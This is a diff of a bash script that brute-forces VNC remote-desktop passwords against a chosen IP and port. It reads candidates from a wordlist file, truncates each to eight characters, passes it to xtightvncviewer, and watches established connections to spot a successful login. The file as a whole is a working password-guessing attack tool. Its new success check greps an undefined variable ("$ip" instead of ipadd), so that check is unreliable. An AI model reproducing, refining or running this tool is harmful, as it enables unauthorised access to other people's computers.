@@ -1,9 +1,9 @@
 #!/bin/bash
-read -p "Host IP4 Address: " ipadd
+read -p "IP4 Address: " ipadd
 read -p "Access Port (default:5900): " port
 read -p "Password File Name: " file_name
-#interface=$(ls /sys/class/net | grep -v "lo")
-interface=$(ip a | awk '/inet.*brd/{print $NF}')
+interface=$(ls /sys/class/net | grep -v "lo")
+#interface=$(ip a | awk '/inet.*brd/{print $NF}')
 connection=0
 echo
 echo -e "\033[34mTrying...\033[0m"
@@ -13,8 +13,8 @@ established=0
 count=0
 sleep 1
 while [ $established -eq 0 ]; 
-do	#netstat error, showing TIME_WAIT
-	if ss -t state established | grep 5900
+do
+	if ss -t state established | grep -q "$ip"
 	then
 		pkill -f "xtightvncviewer"
 		established=1
@@ -70,6 +70,11 @@ then
 	pws=0
 	match=0
 	while read -r line; do
+		lngth=${#line}
+		if (( lngth > 8 ))
+		then
+			line=${line:0:8}
+		fi
 		pws=$((pws+1))
 		echo "Trying: ${line}"
 		xtightvncviewer -passwd <(vncpasswd -f <<<"$line") $ipadd:$port > stdout.txt 2>&1 &
@@ -100,7 +105,6 @@ then
 			pkill -f "xtightvncviewer"
 		else
 			echo "[STATUS]: No response"
-			cat stdout.txt
 			pkill -f "xtightvncviewer"
 		fi
 	done < "$file_name"
